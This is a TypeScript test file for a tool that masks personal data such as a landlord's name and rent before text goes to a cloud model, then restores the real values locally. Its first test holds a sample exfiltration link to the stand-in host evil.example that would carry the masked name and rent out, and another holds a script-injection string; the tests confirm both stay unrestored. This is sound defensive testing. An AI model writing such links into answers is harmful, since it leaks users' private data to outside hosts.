import { describe, expect, it } from 'vitest';
import { CLOUD_EXPRESSION_INSTRUCTION, restoreAnswer } from './restore';
import { assignTags, maskText } from './tags';
import type { Entity } from './types';

const ent = (type: Entity['type'], value: string, start: number, role?: string): Entity => ({
  type,
  value,
  start,
  end: start + value.length,
  confidence: 0.9,
  source: 'rules',
  ...(role ? { role } : {}),
});

const entities = [
  ent('PERSON', 'Karim Fathy', 0, 'landlord'),
  ent('MONEY', 'EGP 8,500', 30, 'rent'),
];
const tags = assignTags(entities);

describe('restoreAnswer', () => {
  it('never restores a tag inside a link (an injected exfiltration link stays masked)', () => {
    const answer =
      'Your landlord is [LANDLORD]. Verify at https://evil.example/check?who=[LANDLORD]&rent={{RENT * 1}} today.';
    const out = restoreAnswer(answer, tags);
    expect(out.text).toBe(
      'Your landlord is Karim Fathy. Verify at https://evil.example/check?who=[LANDLORD]&rent={{RENT * 1}} today.',
    );
    expect(out.withheld).toEqual(['[LANDLORD]', '{{RENT * 1}}']);
    expect(
      restoreAnswer('Write to mailto:[LANDLORD] or www.example.com/[RENT]', tags).spans,
    ).toHaveLength(0);
  });

  it('puts real values back and works out derived amounts locally', () => {
    const out = restoreAnswer('[LANDLORD] can raise it to {{RENT * 1.10}} at most.', tags);
    expect(out.text).toBe('Karim Fathy can raise it to EGP 9,350 at most.');
    expect(out.spans).toHaveLength(2);
    expect(out.spans[0]).toMatchObject({
      tag: '[LANDLORD]',
      value: 'Karim Fathy',
      computed: false,
    });
    expect(out.spans[1]).toMatchObject({ value: 'EGP 9,350', computed: true });
  });

  it('resolves aliased money tag names like MONTHLY_BASE_SALARY to [SALARY]', () => {
    const salaryTags = assignTags([ent('MONEY', 'EGP 80,000', 0, 'salary')]);
    const out = restoreAnswer('Your bonus is {{MONTHLY_BASE_SALARY * 1.8}}.', salaryTags);
    expect(out.text).toBe('Your bonus is EGP 144,000.');
    expect(out.spans[0]).toMatchObject({
      tag: '{{MONTHLY_BASE_SALARY * 1.8}}',
      value: 'EGP 144,000',
      computed: true,
    });
  });

  it('never guesses an amount for a tag name it does not know', () => {
    // Only [RENT] exists: a cloud-invented DEPOSIT must not borrow the rent.
    const out = restoreAnswer('The deposit is {{DEPOSIT * 2}}.', tags);
    expect(out.text).toBe('The deposit is {{DEPOSIT * 2}}.');
    expect(out.spans).toHaveLength(0);
  });

  it('does not match on a shared word alone (MONTHLY_SALARY is not [MONTHLY_RENT])', () => {
    const rent = assignTags([ent('MONEY', 'EGP 8,500', 0, 'monthly rent')]);
    expect(rent.entries().map((e) => e.tag)).toEqual(['[MONTHLY_RENT]']);
    expect(restoreAnswer('{{MONTHLY_SALARY * 2}}', rent).spans).toHaveLength(0);
    // Every word of the real tag present still resolves.
    expect(restoreAnswer('{{NEW_MONTHLY_RENT * 2}}', rent).text).toBe('EGP 17,000');
  });

  it('leaves an alias unevaluated when it fits more than one amount', () => {
    const two = assignTags([
      ent('MONEY', 'EGP 80,000', 0, 'salary'),
      ent('MONEY', 'EGP 90,000', 20, 'salary'),
    ]);
    expect(two.entries().map((e) => e.tag)).toEqual(['[SALARY]', '[SALARY_2]']);
    expect(restoreAnswer('{{MONTHLY_SALARY * 2}}', two).spans).toHaveLength(0);
    // Exact names still work.
    expect(restoreAnswer('{{SALARY_2 * 2}}', two).text).toBe('EGP 180,000');
  });

  it('gives span offsets into the restored text', () => {
    const out = restoreAnswer('Rent: [RENT]; max {{RENT*1.1}}.', tags);
    for (const s of out.spans) expect(out.text.slice(s.start, s.end)).toBe(s.value);
  });

  it('leaves unknown tags and invalid expressions as written', () => {
    expect(restoreAnswer('Ask [UNKNOWN] about {{RENT * }}.', tags).text).toBe(
      'Ask [UNKNOWN] about {{RENT * }}.',
    );
    expect(restoreAnswer('{{alert(1)}}', tags).text).toBe('{{alert(1)}}');
  });

  it('round-trips a masked clause', () => {
    const clause = 'Karim Fathy says the monthly rent is EGP 8,500.';
    const ents = [
      ent('PERSON', 'Karim Fathy', 0, 'landlord'),
      ent('MONEY', 'EGP 8,500', clause.indexOf('EGP'), 'rent'),
    ];
    const t = assignTags(ents);
    expect(restoreAnswer(maskText(clause, ents, t), t).text).toBe(clause);
  });

  it('formats expressions without a money tag as plain numbers', () => {
    expect(restoreAnswer('{{12 * 3}} months', tags).text).toBe('36 months');
  });
});

describe('CLOUD_EXPRESSION_INSTRUCTION', () => {
  it('tells the cloud to write derived amounts as expressions', () => {
    expect(CLOUD_EXPRESSION_INSTRUCTION).toContain('{{RENT * 1.10}}');
  });
});
